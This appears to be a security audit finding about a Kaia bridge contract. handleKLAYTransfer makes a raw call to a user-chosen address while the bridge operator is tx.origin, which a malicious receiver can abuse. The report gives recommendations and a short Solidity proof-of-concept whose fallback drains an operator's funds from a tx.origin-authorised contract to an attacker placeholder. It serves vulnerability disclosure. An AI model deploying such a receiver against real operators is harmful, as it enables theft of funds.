### Title
Bridge Operator Funds Drainable via `tx.origin` in `handleKLAYTransfer` Raw Call to User-Controlled `_to` — (`contracts/service_chain/bridge/BridgeTransferKLAY.sol`)

### Summary

`handleKLAYTransfer` makes a raw low-level call to a user-controlled `_to` address. The bridge operator who submits this transaction is `tx.origin` for the entire call chain. A malicious `_to` contract can exploit `tx.origin` to drain the operator's funds from any third-party contract that uses `tx.origin` for authorization.

### Finding Description

In `BridgeTransferKLAY.sol`, the `handleKLAYTransfer` function transfers KLAY to the destination address using a raw call:

```solidity
(bool ok, ) = _to.call.value(_value)("");
require(ok, "handleKLAYTransfer: transfer failed");
``` [1](#0-0) 

The `_to` address is fully user-controlled — it is set by whoever initiates the bridge transfer on the source chain. There is no validation that `_to` is an EOA or a trusted contract.

The bridge operator (an EOA registered via `onlyOperators`) is the transaction submitter, so it is `tx.origin` for the entire transaction. This is confirmed by `NewEVMTxContext`, which sets `Origin` to `msg.ValidatedSender()` — the operator's EOA:

```go
func NewEVMTxContext(msg Message, header *types.Header, config *params.ChainConfig) vm.TxContext {
    return vm.TxContext{
        Origin: msg.ValidatedSender(),
        ...
    }
}
``` [2](#0-1) 

The `nonReentrant` modifier on `handleKLAYTransfer` only prevents reentrancy back into the bridge contract itself. It does not prevent the malicious `_to` from calling arbitrary third-party contracts during its fallback execution. [3](#0-2) 

### Impact Explanation

If the bridge operator holds a balance in any third-party contract that uses `tx.origin` for authorization (e.g., a staking contract, a DeFi protocol, or a withdrawal contract that checks `require(tx.origin == owner)`), a malicious `_to` contract can:

1. Accept the KLAY transfer (so `ok == true` and the call succeeds)
2. In its fallback, call the third-party contract using `tx.origin` (the operator's address) as the authorized caller
3. Drain the operator's funds from that third-party contract

This results in an **unauthorized transfer of KAIA** from the bridge operator's account in a third-party contract, matching the allowed impact gate.

### Likelihood Explanation

- **Trigger**: Any user who can initiate a KLAY bridge transfer on the source chain (unprivileged, no special access required beyond normal bridge usage)
- **Precondition**: The bridge operator must hold funds in a third-party contract that uses `tx.origin` for authorization. Bridge operators are active on-chain participants who may hold positions in DeFi protocols, staking contracts, or other systems
- **Operator awareness**: Bridge operators have no visibility into what code `_to` will execute; they only see the destination address

### Recommendation

1. **Validate `_to`**: Reject transfers to contract addresses, or maintain an allowlist of trusted recipient contracts.
2. **Use a dedicated intermediary**: Instead of calling `_to.call.value(_value)("")` directly from the operator's transaction, route the KLAY transfer through a separate contract that acts as the `tx.origin`, isolating the operator's EOA from arbitrary code execution.
3. **Document the risk**: Advise bridge operators to use a dedicated EOA that holds no funds in any third-party contract that uses `tx.origin` for authorization.

### Proof of Concept

```solidity
// Attacker deploys this contract and sets it as _to in a source-chain bridge request
contract MaliciousReceiver {
    // Third-party contract where the bridge operator has funds
    IVictimProtocol constant victim = IVictimProtocol(0xVICTIM);
    address constant attacker = 0xATTACKER;

    // Fallback called by handleKLAYTransfer via _to.call.value(_value)("")
    function() external payable {
        // tx.origin == bridge operator's EOA
        // If victim uses tx.origin for authorization:
        victim.withdrawAll(tx.origin, attacker); // drains operator's funds in victim
    }
}
```

**Attack flow:**
1. Attacker calls `requestKLAYTransfer` on the source chain with `_to = MaliciousReceiver`
2. Bridge operator calls `handleKLAYTransfer` on the destination chain
3. Line 98 executes: `(bool ok, ) = _to.call.value(_value)("")`
4. `MaliciousReceiver.fallback()` runs with `tx.origin == operator`
5. `victim.withdrawAll(tx.origin, attacker)` drains the operator's funds from the victim contract
6. `ok == true`, so `require` passes and the transaction succeeds silently [4](#0-3) [5](#0-4)
